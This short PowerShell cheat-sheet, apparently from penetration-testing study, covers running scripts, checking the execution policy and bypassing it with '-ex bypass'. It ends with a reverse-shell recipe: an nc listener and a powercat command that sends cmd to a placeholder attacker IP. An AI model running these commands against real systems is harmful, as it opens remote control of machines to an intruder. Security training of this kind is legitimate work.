# Powershell

Open a text editor and enter: 

    Write-Output "something"

Save the file with a `.PS1` extension and execute it from the cmd: 

    powershell -File scriptname.ps1

## Execution policy

To check if we are restricted: 

    Get-ExecutionPolicy

If so, change it with: 

    Set-ExecutionPolicy -Scope CurrentUser RemoteSigned

Or bypass restrictions when executing the script: 

    powershell -ex bypass -File scriptname.ps1

## Reverse shell

We can use powercat.

Set up a listener on the attack machine: 

    nc -lvp 443

Launch powercat:

    powershell -c "powercat -c ATTACKING-MACHINE-IPP -p 443 -e cmd"

We get a shell.